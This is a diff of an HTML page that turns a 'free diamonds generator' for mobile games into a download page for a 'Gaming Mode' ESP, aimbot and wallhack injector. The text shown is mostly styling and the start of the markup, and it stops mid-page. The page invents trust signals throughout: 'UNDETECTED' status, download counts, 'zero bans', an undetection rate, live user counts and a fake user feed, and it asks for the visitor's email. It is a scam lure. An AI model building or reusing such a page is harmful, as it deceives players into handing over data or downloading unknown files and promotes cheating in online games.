@@ -3,533 +3,563 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Free Diamonds Generator 2026 - Get unlimited free diamonds for Free Fire, PUBG Mobile, Mobile Legends. No verification needed.">
-    <meta name="keywords" content="free fire diamonds, free diamonds, diamond generator, pubg uc, mobile legends diamonds">
-    <meta property="og:title" content="Free Diamonds Generator 2026 - 100% Working">
-    <meta property="og:description" content="Generate unlimited free diamonds for your favorite games. No human verification required.">
-    <meta property="og:image" content="assets/og-image.png">
-    <link rel="icon" type="image/png" href="assets/favicon.png">
-    <title>Free Diamonds Generator 2026 - Get Free Gaming Currency Instantly</title>
+    <meta name="description" content="Download the ultimate Gaming Mode Injector with ESP Hack, Aimbot, and Wallhack for Free Fire, PUBG Mobile, and COD Mobile.">
+    <meta name="keywords" content="gaming mode, esp hack, injector, free fire hack, pubg mobile hack, cod mobile hack, wallhack, aimbot">
+    <meta property="og:title" content="Gaming Mode Pro v9.0 - ESP Hack + Aimbot Injector 2026">
+    <meta property="og:description" content="Unlock ESP Hack, Aimbot, Wallhack for your favorite games. 100% Undetected. No root required.">
+    <link rel="icon" type="image/png" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect fill='%23000' width='32' height='32' rx='6'/%3E%3Ctext x='16' y='22' text-anchor='middle' fill='%230f0' font-size='20'%3EGM%3C/text%3E%3C/svg%3E">
+    <title>Gaming Mode Pro v9.0 - Injector ESP Hack 2026</title>
     
     <style>
         :root {
-            --bg: #0a0e17;
-            --bg2: #111827;
-            --bg3: #1a2236;
-            --gold: #f0b90b;
-            --gold2: #fcd535;
-            --green: #00c853;
-            --red: #ff1744;
-            --blue: #2962ff;
-            --text: #e0e0e0;
-            --text2: #9e9e9e;
-            --border: #263040;
-            --card: #141c2b;
+            --bg: #000000;
+            --bg2: #0a0a0a;
+            --bg3: #111111;
+            --neon: #00ff41;
+            --neon2: #39ff14;
+            --red: #ff0040;
+            --blue: #00bfff;
+            --text: #cccccc;
+            --text2: #777777;
+            --border: #1a1a1a;
+            --card: #0d0d0d;
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        @font-face {
+            font-family: 'Mono';
+            src: local('Courier New');
         }
 
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             background: var(--bg);
             color: var(--text);
             min-height: 100vh;
-            line-height: 1.6;
-            -webkit-font-smoothing: antialiased;
         }
 
-        /* Top Notification Bar */
-        .top-notify {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
+        .bg-grid {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-image: 
+                linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 15px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Alert Bar */
+        .alert-bar {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
             padding: 10px 15px;
             text-align: center;
-            font-size: 13px;
-            color: #f0b90b;
-            border-bottom: 1px solid #2a2a4a;
-            animation: pulse-bg 2s infinite;
+            font-size: 12px;
+            color: var(--neon);
+            font-family: 'Mono', monospace;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        @keyframes pulse-bg {
-            0%, 100% { background: linear-gradient(135deg, #1a1a2e, #16213e); }
-            50% { background: linear-gradient(135deg, #1e1e35, #1a2744); }
-        }
-
-        .top-notify i {
-            animation: blink 1s infinite;
+        .blink {
+            animation: blink 1.2s infinite;
         }
 
         @keyframes blink {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            50% { opacity: 0.2; }
         }
 
         /* Header */
         .header {
-            background: var(--bg2);
-            padding: 15px 20px;
-            border-bottom: 1px solid var(--border);
             display: flex;
             align-items: center;
             justify-content: space-between;
+            padding: 15px 0;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 20px;
             flex-wrap: wrap;
             gap: 10px;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            backdrop-filter: blur(10px);
         }
 
         .logo {
             display: flex;
             align-items: center;
-            gap: 8px;
-            font-size: 22px;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: #000;
+            border: 2px solid var(--neon);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Mono', monospace;
+            color: var(--neon);
+            font-weight: 900;
+            font-size: 14px;
+            box-shadow: 0 0 15px rgba(0,255,65,0.2);
+        }
+
+        .logo-text {
+            font-size: 20px;
             font-weight: 800;
             color: #fff;
-            text-decoration: none;
         }
 
-        .logo img {
-            width: 36px;
-            height: 36px;
-            border-radius: 8px;
+        .logo-text span {
+            color: var(--neon);
         }
 
-        .logo span {
-            background: linear-gradient(135deg, #f0b90b, #ff8c00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .version-badge {
+            background: #000;
+            border: 1px solid var(--neon);
+            color: var(--neon);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-family: 'Mono', monospace;
         }
 
-        .header-badges {
+        .status-dots {
             display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
+            gap: 10px;
+            font-size: 11px;
+            color: var(--text2);
         }
 
-        .badge {
-            background: var(--bg3);
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            color: var(--text2);
+        .status-dot {
             display: flex;
             align-items: center;
             gap: 5px;
-            border: 1px solid var(--border);
         }
 
-        .badge.green i { color: var(--green); }
-        .badge.gold i { color: var(--gold); }
-        .badge.blue i { color: var(--blue); }
-
-        /* Main Container */
-        .container {
-            max-width: 680px;
-            margin: 0 auto;
-            padding: 20px 15px 40px;
+        .status-dot .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
         }
 
-        /* Hero Section */
+        .dot.green { background: var(--neon); box-shadow: 0 0 8px var(--neon); }
+        .dot.yellow { background: #ffaa00; box-shadow: 0 0 8px #ffaa00; }
+
+        /* Hero */
         .hero {
             text-align: center;
-            padding: 20px 0 10px;
+            padding: 20px 0;
         }
 
         .hero h1 {
-            font-size: 28px;
-            font-weight: 800;
+            font-size: 32px;
+            font-weight: 900;
             color: #fff;
-            margin-bottom: 8px;
-            line-height: 1.3;
+            line-height: 1.2;
+            margin-bottom: 10px;
         }
 
-        .hero h1 span {
-            background: linear-gradient(135deg, #f0b90b, #ff8c00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .hero h1 .green {
+            color: var(--neon);
+            text-shadow: 0 0 20px rgba(0,255,65,0.3);
         }
 
-        .hero p {
-            color: var(--text2);
+        .hero-sub {
             font-size: 14px;
-            max-width: 450px;
+            color: var(--text2);
+            max-width: 500px;
             margin: 0 auto 15px;
         }
 
-        /* Step Indicator */
-        .steps-indicator {
+        /* Feature Chips */
+        .feature-chips {
             display: flex;
             justify-content: center;
-            gap: 8px;
-            margin: 15px 0;
+            gap: 10px;
             flex-wrap: wrap;
+            margin: 15px 0;
         }
 
-        .step-dot {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: var(--bg3);
-            border: 2px solid var(--border);
+        .chip {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: var(--text);
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 13px;
-            font-weight: 700;
-            color: var(--text2);
-            transition: all 0.3s;
+            gap: 5px;
         }
 
-        .step-dot.active {
-            background: var(--gold);
-            border-color: var(--gold);
-            color: #000;
-            box-shadow: 0 0 20px rgba(240,185,11,0.4);
-        }
+        .chip i { color: var(--neon); }
 
-        .step-dot.done {
-            background: var(--green);
-            border-color: var(--green);
-            color: #fff;
-        }
-
-        /* Main Card */
-        .main-card {
-            background: var(--card);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 25px 20px;
-            margin-top: 10px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
-        }
-
-        .card-title {
-            text-align: center;
+        /* Main Section */
+        .section-title {
             font-size: 18px;
             font-weight: 700;
-            margin-bottom: 20px;
             color: #fff;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        /* Game Selection Grid */
-        .game-grid {
+        .section-title::before {
+            content: '';
+            width: 4px;
+            height: 20px;
+            background: var(--neon);
+            border-radius: 2px;
+        }
+
+        /* Game Cards */
+        .game-select {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
 
         @media (max-width: 480px) {
-            .game-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
-            .hero h1 {
-                font-size: 22px;
-            }
+            .game-select { grid-template-columns: repeat(2, 1fr); }
+            .hero h1 { font-size: 24px; }
         }
 
-        .game-card {
-            background: var(--bg3);
+        .game-option {
+            background: var(--card);
             border: 2px solid var(--border);
             border-radius: 12px;
-            padding: 15px 10px;
+            padding: 18px 12px;
             text-align: center;
             cursor: pointer;
             transition: all 0.3s;
             position: relative;
-            overflow: hidden;
         }
 
-        .game-card:hover {
-            border-color: var(--gold);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(240,185,11,0.15);
+        .game-option:hover {
+            border-color: #333;
         }
 
-        .game-card.selected {
-            border-color: var(--gold);
-            background: #1a1a2e;
-            box-shadow: 0 0 0 4px rgba(240,185,11,0.15);
+        .game-option.selected {
+            border-color: var(--neon);
+            background: #0a1a0a;
+            box-shadow: 0 0 20px rgba(0,255,65,0.1);
         }
 
-        .game-card .popular-tag {
+        .game-option .hot-tag {
             position: absolute;
-            top: 8px;
-            right: -25px;
+            top: -8px;
+            right: 10px;
             background: var(--red);
             color: #fff;
             font-size: 9px;
-            padding: 2px 25px;
-            transform: rotate(45deg);
+            padding: 2px 10px;
+            border-radius: 10px;
             font-weight: 700;
+            letter-spacing: 1px;
         }
 
-        .game-card img {
-            width: 50px;
-            height: 50px;
-            border-radius: 12px;
+        .game-option .icon {
+            font-size: 36px;
             margin-bottom: 8px;
         }
 
-        .game-card .game-name {
-            font-size: 12px;
-            font-weight: 600;
+        .game-option .name {
+            font-size: 13px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+
+        .game-option .hack-type {
+            font-size: 10px;
+            color: var(--neon);
+            font-family: 'Mono', monospace;
+        }
+
+        /* Hack Features Grid */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .feature-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .feature-card:hover {
+            border-color: #333;
+        }
+
+        .feature-card.selected {
+            border-color: var(--neon);
+            background: #0a1a0a;
+        }
+
+        .feature-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .feature-info h4 {
+            font-size: 13px;
             color: #fff;
             margin-bottom: 3px;
         }
 
-        .game-card .game-sub {
+        .feature-info p {
             font-size: 10px;
             color: var(--text2);
+            line-height: 1.4;
         }
 
-        /* Form Elements */
+        .feature-check {
+            margin-left: auto;
+            color: var(--neon);
+            font-size: 18px;
+            display: none;
+        }
+
+        .feature-card.selected .feature-check {
+            display: block;
+        }
+
+        /* Device Select */
+        .device-select {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .device-opt {
+            flex: 1;
+            background: var(--card);
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .device-opt.selected {
+            border-color: var(--neon);
+            background: #0a1a0a;
+        }
+
+        .device-opt .dev-icon { font-size: 30px; margin-bottom: 5px; }
+        .device-opt .dev-name { font-size: 12px; font-weight: 600; color: #fff; }
+        .device-opt .dev-sub { font-size: 10px; color: var(--text2); }
+
+        /* Email Input */
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
 
         .input-group label {
             display: block;
             font-size: 13px;
             font-weight: 600;
-            color: var(--text);
-            margin-bottom: 6px;
+            color: #ccc;
+            margin-bottom: 8px;
         }
 
-        .input-group input,
-        .input-group select {
+        .input-group input {
             width: 100%;
-            padding: 12px 15px;
-            background: var(--bg);
+            padding: 14px 16px;
+            background: #000;
             border: 1px solid var(--border);
-            border-radius: 10px;
+            border-radius: 8px;
             color: #fff;
             font-size: 14px;
-            transition: all 0.3s;
+            font-family: 'Mono', monospace;
             outline: none;
-        }
-
-        .input-group input:focus,
-        .input-group select:focus {
-            border-color: var(--gold);
-            box-shadow: 0 0 0 3px rgba(240,185,11,0.1);
-        }
-
-        .input-group select {
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23f0b90b' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 15px center;
-            cursor: pointer;
-        }
-
-        /* Diamond Options */
-        .diamond-options {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-
-        @media (max-width: 400px) {
-            .diamond-options {
-                grid-template-columns: repeat(2, 1fr);
-            }
-        }
-
-        .diamond-opt {
-            background: var(--bg3);
-            border: 2px solid var(--border);
-            border-radius: 10px;
-            padding: 12px 8px;
-            text-align: center;
-            cursor: pointer;
             transition: all 0.3s;
         }
 
-        .diamond-opt:hover {
-            border-color: var(--gold);
+        .input-group input:focus {
+            border-color: var(--neon);
+            box-shadow: 0 0 0 3px rgba(0,255,65,0.05);
         }
 
-        .diamond-opt.selected {
-            border-color: var(--gold);
-            background: #1a1a2e;
-        }
-
-        .diamond-opt .amount {
-            font-size: 18px;
-            font-weight: 800;
-            color: var(--gold);
-            display: block;
-        }
-
-        .diamond-opt .label {
+        .input-hint {
             font-size: 10px;
             color: var(--text2);
-            margin-top: 2px;
+            margin-top: 5px;
+            font-family: 'Mono', monospace;
         }
 
-        .diamond-opt .popular {
-            display: inline-block;
-            background: var(--red);
-            color: #fff;
-            font-size: 9px;
-            padding: 2px 8px;
-            border-radius: 10px;
-            margin-top: 4px;
-            font-weight: 700;
-        }
-
-        /* Buttons */
-        .btn-generate {
+        /* CTA Button */
+        .btn-download {
             width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #f0b90b, #ff8c00);
+            padding: 18px;
+            background: var(--neon);
             border: none;
-            border-radius: 12px;
+            border-radius: 8px;
             color: #000;
             font-size: 16px;
-            font-weight: 800;
+            font-weight: 900;
             cursor: pointer;
-            transition: all 0.3s;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 2px;
+            font-family: 'Mono', monospace;
+            transition: all 0.3s;
             position: relative;
             overflow: hidden;
         }
 
-        .btn-generate:hover {
+        .btn-download:hover {
+            box-shadow: 0 0 40px rgba(0,255,65,0.4);
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(240,185,11,0.3);
         }
 
-        .btn-generate:active {
+        .btn-download:active {
             transform: scale(0.97);
         }
 
-        .btn-generate.loading {
+        .btn-download.downloading {
             pointer-events: none;
-            opacity: 0.7;
+            opacity: 0.6;
         }
 
-        .btn-generate .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #000;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-left: 10px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Progress Bar */
-        .progress-section {
-            display: none;
-            margin-top: 20px;
-        }
-
-        .progress-section.show {
-            display: block;
-        }
-
-        .progress-bar-wrap {
-            background: var(--bg3);
-            border-radius: 20px;
-            height: 8px;
-            margin: 10px 0;
-            overflow: hidden;
-        }
-
-        .progress-bar-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #f0b90b, #00c853);
-            border-radius: 20px;
-            transition: width 0.8s ease;
-            width: 0%;
-        }
-
-        .progress-text {
-            text-align: center;
-            font-size: 12px;
-            color: var(--text2);
-        }
-
-        .progress-steps {
-            display: flex;
-            justify-content: space-between;
-            font-size: 10px;
-            color: var(--text2);
-            margin-top: 5px;
-        }
-
-        /* Live Counter / Fake Stats */
-        .live-stats {
+        /* Trust Strip */
+        .trust-strip {
             display: flex;
             justify-content: center;
             gap: 20px;
             flex-wrap: wrap;
-            margin: 15px 0;
-            font-size: 12px;
-            color: var(--text2);
-        }
-
-        .live-stat {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .live-stat .dot {
-            width: 8px;
-            height: 8px;
-            background: var(--green);
-            border-radius: 50%;
-            animation: pulse-dot 1.5s infinite;
-        }
-
-        @keyframes pulse-dot {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(0,200,83,0.6); }
-            50% { box-shadow: 0 0 0 10px rgba(0,200,83,0); }
-        }
-
-        /* Trust Badges */
-        .trust-row {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin: 20px 0 10px;
+            margin: 20px 0;
             font-size: 11px;
             color: var(--text2);
         }
 
-        .trust-item {
+        .trust-strip span {
             display: flex;
             align-items: center;
             gap: 5px;
         }
 
-        .trust-item i {
-            color: var(--green);
+        .trust-strip .trust-icon { color: var(--neon); }
+
+        /* Stats */
+        .stats-bar {
+            display: flex;
+            justify-content: space-around;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 18px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+            gap: 10px;
         }
 
-        /* Comments Section */
-        .comments-section {
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--neon);
+            font-family: 'Mono', monospace;
+        }
+
+        .stat-label {
+            font-size: 10px;
+            color: var(--text2);
+            margin-top: 3px;
+        }
+
+        /* Warning Box */
+        .warning-box {
+            background: #0a0a00;
+            border: 1px solid #3a3a00;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 11px;
+            color: #aaaa00;
+        }
+
+        .warning-box strong {
+            color: #ffaa00;
+        }
+
+        /* Steps */
+        .steps-vertical {
+            margin: 20px 0;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .step-num {
+            width: 30px;
+            height: 30px;
+            background: #000;
+            border: 1px solid var(--neon);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: var(--neon);
+            flex-shrink: 0;
+            font-size: 13px;
+        }
+
+        .step-content h4 {
+            font-size: 13px;
+            color: #fff;
+            margin-bottom: 3px;
+        }
+
+        .step-content p {
+            font-size: 11px;
+            color: var(--text2);
+        }
+
+        /* Discord Style Comments */
+        .live-feed {
             margin-top: 25px;
         }
 
-        .comments-title {
-            font-size: 16px;
+        .live-feed-title {
+            font-size: 15px;
             font-weight: 700;
             color: #fff;
             margin-bottom: 15px;
@@ -538,82 +568,92 @@
             gap: 8px;
         }
 
-        .comment {
-            background: var(--bg3);
-            border-radius: 10px;
-            padding: 12px 15px;
-            margin-bottom: 10px;
+        .feed-item {
+            background: var(--card);
             border: 1px solid var(--border);
-        }
-
-        .comment-header {
+            border-radius: 8px;
+            padding: 12px 15px;
+            margin-bottom: 8px;
             display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 6px;
+            gap: 12px;
+            align-items: flex-start;
         }
 
-        .comment-avatar {
-            width: 32px;
-            height: 32px;
+        .feed-avatar {
+            width: 36px;
+            height: 36px;
             border-radius: 50%;
-            background: var(--border);
+            flex-shrink: 0;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 700;
             font-size: 14px;
-            color: var(--gold);
         }
 
-        .comment-name {
+        .feed-body {
+            flex: 1;
+        }
+
+        .feed-user {
+            font-size: 12px;
             font-weight: 600;
-            font-size: 13px;
             color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .comment-time {
-            font-size: 11px;
+        .feed-badge {
+            font-size: 9px;
+            background: var(--neon);
+            color: #000;
+            padding: 1px 8px;
+            border-radius: 10px;
+            font-weight: 700;
+        }
+
+        .feed-time {
+            font-size: 10px;
             color: var(--text2);
         }
 
-        .comment-text {
+        .feed-text {
             font-size: 12px;
-            color: var(--text);
-            line-height: 1.5;
+            color: #aaa;
+            margin-top: 4px;
         }
 
-        .comment-stars {
-            color: var(--gold);
-            font-size: 11px;
+        .feed-game {
+            display: inline-block;
+            font-size: 9px;
+            background: #000;
+            border: 1px solid #333;
+            color: var(--text2);
+            padding: 2px 8px;
+            border-radius: 10px;
+            margin-top: 5px;
         }
 
         /* Footer */
         .footer {
             text-align: center;
             padding: 20px;
-            font-size: 11px;
-            color: var(--text2);
+            font-size: 10px;
+            color: #444;
             border-top: 1px solid var(--border);
             margin-top: 30px;
         }
 
-        .footer a {
-            color: var(--text2);
-            text-decoration: none;
-            margin: 0 8px;
-        }
+        .footer a { color: #555; text-decoration: none; margin: 0 8px; }
 
-        /* Overlay / Processing Modal */
+        /* Overlay */
         .overlay {
             display: none;
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.85);
-            z-index: 200;
+            inset: 0;
+            background: rgba(0,0,0,0.92);
+            z-index: 99;
             justify-content: center;
             align-items: center;
             flex-direction: column;
@@ -623,322 +663,268 @@
             display: flex;
         }
 
-        .overlay-card {
-            background: var(--card);
+        .overlay-box {
+            background: #0d0d0d;
+            border: 1px solid var(--neon);
+            border-radius: 12px;
             padding: 30px;
-            border-radius: 16px;
             text-align: center;
             max-width: 400px;
             width: 90%;
-            border: 1px solid var(--border);
+            box-shadow: 0 0 60px rgba(0,255,65,0.1);
         }
 
-        .overlay-icon {
-            font-size: 50px;
-            margin-bottom: 15px;
-        }
+        .overlay-icon { font-size: 50px; margin-bottom: 15px; }
+        .overlay-title { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 8px; }
+        .overlay-sub { font-size: 12px; color: var(--text2); margin-bottom: 20px; }
 
-        .overlay-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 10px;
-        }
-
-        .overlay-text {
-            font-size: 13px;
-            color: var(--text2);
-            margin-bottom: 15px;
-        }
-
-        .overlay-steps {
-            text-align: left;
-            font-size: 12px;
-            color: var(--text2);
+        .overlay-progress {
+            height: 4px;
+            background: #1a1a1a;
+            border-radius: 2px;
+            overflow: hidden;
             margin: 15px 0;
         }
 
-        .overlay-steps div {
-            padding: 5px 0;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+        .overlay-progress-fill {
+            height: 100%;
+            background: var(--neon);
+            width: 0%;
+            transition: width 0.3s;
+            box-shadow: 0 0 10px var(--neon);
         }
 
-        .overlay-steps .check {
-            color: var(--green);
+        .overlay-log {
+            text-align: left;
+            font-family: 'Mono', monospace;
+            font-size: 10px;
+            color: var(--neon);
+            background: #000;
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 15px;
+            max-height: 120px;
+            overflow-y: auto;
+            line-height: 1.8;
         }
 
-        .overlay-steps .pending {
-            color: var(--gold);
-            animation: blink 1s infinite;
+        .overlay-log .line { opacity: 0; animation: fadeIn 0.3s forwards; }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
         }
 
-        /* Success State */
-        .success-box {
-            display: none;
-            text-align: center;
-            padding: 20px;
+        /* Glitch Effect */
+        .glitch {
+            position: relative;
         }
 
-        .success-box.show {
-            display: block;
+        .glitch:hover {
+            animation: glitch 0.3s ease;
         }
 
-        .success-icon {
-            font-size: 60px;
-            color: var(--green);
-            margin-bottom: 10px;
-        }
-
-        .success-title {
-            font-size: 22px;
-            font-weight: 800;
-            color: var(--green);
-            margin-bottom: 5px;
-        }
-
-        .success-amount {
-            font-size: 36px;
-            font-weight: 900;
-            color: var(--gold);
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .container { padding: 10px; }
-            .main-card { padding: 15px; }
-            .game-grid { gap: 6px; }
-            .game-card { padding: 10px 5px; }
-            .game-card img { width: 40px; height: 40px; }
-            .diamond-options { gap: 5px; }
-            .diamond-opt { padding: 10px 5px; }
-            .diamond-opt .amount { font-size: 15px; }
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(2px, -2px); }
+            60% { transform: translate(-1px, -1px); }
+            80% { transform: translate(1px, 1px); }
         }
     </style>
 </head>
 <body>
+    <div class="bg-grid"></div>
 
-    <!-- Top Notification -->
-    <div class="top-notify">
-        <i>⚡</i> <strong>HOT:</strong> Free Fire 8th Anniversary Event - Limited diamond drops available today! <i>⚡</i>
-    </div>
-
-    <!-- Header -->
-    <header class="header">
-        <a href="#" class="logo">
-            <span>💎 DiamondGen</span>
-        </a>
-        <div class="header-badges">
-            <span class="badge green"><i>●</i> Online Generator</span>
-            <span class="badge gold"><i>★</i> 4.9/5 Rating</span>
-            <span class="badge blue"><i>🔒</i> SSL Encrypted</span>
-        </div>
-    </header>
-
-    <!-- Main Container -->
     <div class="container">
+
+        <!-- Alert Bar -->
+        <div class="alert-bar">
+            <span class="blink">●</span>
+            <span>[ SYSTEM ] INJECTOR v9.0 STATUS: <strong>UNDETECTED</strong> | LAST UPDATED: <span id="currentDate"></span></span>
+        </div>
+
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <div class="logo-icon glitch">GM</div>
+                <div class="logo-text">Gaming<span>Mode</span></div>
+            </div>
+            <div class="status-dots">
+                <span class="status-dot"><span class="dot green"></span> Injector Online</span>
+                <span class="status-dot"><span class="dot yellow"></span> <span id="onlineNow">2,384</span> Users</span>
+            </div>
+            <span class="version-badge">v9.0.1 BETA</span>
+        </header>
 
         <!-- Hero -->
         <div class="hero">
-            <h1>Free <span>Diamonds</span> Generator 2026</h1>
-            <p>Select your game, choose your diamond amount, and get them instantly. No human verification required.</p>
-            
-            <!-- Live Stats -->
-            <div class="live-stats">
-                <span class="live-stat"><span class="dot"></span> <span id="onlineCount">2,847</span> Online</span>
-                <span class="live-stat">🎮 <span id="todayGenerated">12,450</span> Generated Today</span>
-                <span class="live-stat">✅ <span id="successRate">98.7%</span> Success Rate</span>
+            <h1>Unlock <span class="green">ESP Hack</span> + Aimbot Injector</h1>
+            <p class="hero-sub">Dominate Free Fire, PUBG Mobile, and COD Mobile with undetected ESP, Aimbot, and Wallhack.</p>
+            <div class="feature-chips">
+                <span class="chip"><i>●</i> ESP Line</span>
+                <span class="chip"><i>●</i> Aimbot</span>
+                <span class="chip"><i>●</i> Wallhack</span>
+                <span class="chip"><i>●</i> No Recoil</span>
+                <span class="chip"><i>●</i> Anti-Ban</span>
             </div>
         </div>
 
-        <!-- Step Indicator -->
-        <div class="steps-indicator">
-            <span class="step-dot active" id="stepDot1">1</span>
-            <span style="color:var(--text2); align-self:center;">→</span>
-            <span class="step-dot" id="stepDot2">2</span>
-            <span style="color:var(--text2); align-self:center;">→</span>
-            <span class="step-dot" id="stepDot3">3</span>
-            <span style="color:var(--text2); align-self:center;">→</span>
-            <span class="step-dot" id="stepDot4">4</span>
+        <!-- Stats -->
+        <div class="stats-bar">
+            <div class="stat-item">
+                <div class="stat-number">147,293</div>
+                <div class="stat-label">Total Downloads</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">92,841</div>
+                <div class="stat-label">Active Users</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">0</div>
+                <div class="stat-label">Bans Reported</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">99.3%</div>
+                <div class="stat-label">Undetection Rate</div>
+            </div>
         </div>
 
-        <!-- Main Card -->
-        <div class="main-card">
-
-            <!-- Step 1: Game Selection -->
-            <div id="step1">
-                <div class="card-title">🎯 Step 1: Select Your Game</div>
-                <div class="game-grid">
-                    <div class="game-card selected" data-game="freefire" onclick="selectGame(this)">
-                        <span class="popular-tag">HOT</span>
-                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23ff6d00' width='100' height='100' rx='20'/%3E%3Ctext x='50' y='65' text-anchor='middle' font-size='50'%3E🔥%3C/text%3E%3C/svg%3E" alt="Free Fire">
-                        <div class="game-name">Free Fire</div>
-                        <div class="game-sub">Diamonds</div>
-                    </div>
-                    <div class="game-card" data-game="pubg" onclick="selectGame(this)">
-                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23212121' width='100' height='100' rx='20'/%3E%3Ctext x='50' y='65' text-anchor='middle' font-size='45'%3E🔫%3C/text%3E%3C/svg%3E" alt="PUBG Mobile">
-                        <div class="game-name">PUBG Mobile</div>
-                        <div class="game-sub">UC</div>
-                    </div>
-                    <div class="game-card" data-game="mlbb" onclick="selectGame(this)">
